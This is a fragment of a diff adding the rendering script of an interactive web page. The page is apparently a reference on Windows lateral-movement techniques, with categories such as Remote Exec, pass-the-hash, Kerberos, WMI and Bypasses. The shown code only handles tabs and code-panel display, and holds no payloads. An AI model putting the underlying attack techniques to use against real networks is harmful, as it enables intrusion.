+'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
+'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
+'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
+'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
+'<div class="ft">'+[{c:"#f87171",l:"Remote Exec"},{c:"#60a5fa",l:"RDP"},{c:"#a78bfa",l:"PTH"},{c:"#fbbf24",l:"Kerberos"},{c:"#34d399",l:"File Xfer"},{c:"#f59e0b",l:"WMI"},{c:"#e879f9",l:"Advanced"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Bypasses"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
+$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
+$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
+$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
+$$('.cp').forEach(function(p){
+p.querySelector('.ct2').onclick=function(){
+var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
+if(ex){ex.remove();cv.classList.remove('op');return}
+cv.classList.add('op');
+var ci=parseInt(p.dataset.ci),c=codes[ci];
+var pre=document.createElement('pre');pre.className='cb mono';
+pre.innerHTML=c.c.split('\n').map(function(line){
+var ci2=line.indexOf('//');
+if(ci2>=0)return esc(line.slice(0,ci2))+'<span class="cm">'+esc(line.slice(ci2))+'</span>';
+if(line.trimStart().charAt(0)==='#')return'<span class="pp">'+esc(line)+'</span>';
+return esc(line);
+}).join('\n');
+p.appendChild(pre);};
+});
+$$('.ti').forEach(function(p){
+p.querySelector('.tt').onclick=function(){
+var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
+if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
+p.classList.add('op');cv.classList.add('op');
+var ti=parseInt(p.dataset.ti);
+var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
+p.appendChild(div);};
+});
+}
+render();
+</script>
+</body>
+</html>
